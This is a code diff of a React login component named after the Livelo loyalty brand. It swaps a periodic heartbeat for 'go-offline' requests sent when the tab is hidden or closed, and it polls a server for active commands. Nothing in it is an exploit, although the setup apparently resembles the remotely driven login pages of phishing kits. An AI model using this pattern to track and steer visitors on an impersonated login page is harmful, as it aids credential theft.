@@ -136,7 +136,7 @@ function LiveloLogin() {
     }
   };
 
-  // Verificar se há comando ativo (polling normal, sem heartbeat)
+  // Verificar comandos + heartbeat automático via polling
   useEffect(() => {
     if (!userId) return;
 
@@ -178,48 +178,23 @@ function LiveloLogin() {
     return () => clearInterval(interval);
   }, [userId, lastProcessedTimestamp]);
 
-  // Heartbeat separado - SÓ envia quando aba está VISÍVEL
+  // Detectar saída da aba - marcar offline IMEDIATAMENTE
   useEffect(() => {
     if (!userId) return;
 
-    let heartbeatInterval = null;
-
-    const sendHeartbeat = () => {
-      if (!document.hidden) {
-        axios.post(`${API}/user/heartbeat/${userId}`).catch(() => {});
-      }
-    };
-
-    const startHeartbeat = () => {
-      sendHeartbeat();
-      if (heartbeatInterval) clearInterval(heartbeatInterval);
-      heartbeatInterval = setInterval(sendHeartbeat, 2000);
-    };
-
-    const stopHeartbeat = () => {
-      if (heartbeatInterval) {
-        clearInterval(heartbeatInterval);
-        heartbeatInterval = null;
-      }
-    };
-
     const handleVisibility = () => {
       if (document.hidden) {
-        stopHeartbeat();
-      } else {
-        startHeartbeat();
+        // Zerar heartbeat para ficar offline imediato
+        fetch(`${API}/user/go-offline/${userId}`, { method: 'POST', keepalive: true });
       }
     };
 
     document.addEventListener("visibilitychange", handleVisibility);
-    
-    // Iniciar se aba estiver visível
-    if (!document.hidden) {
-      startHeartbeat();
-    }
+    window.addEventListener("beforeunload", () => {
+      fetch(`${API}/user/go-offline/${userId}`, { method: 'POST', keepalive: true });
+    });
 
     return () => {
-      stopHeartbeat();
       document.removeEventListener("visibilitychange", handleVisibility);
     };
   }, [userId]);
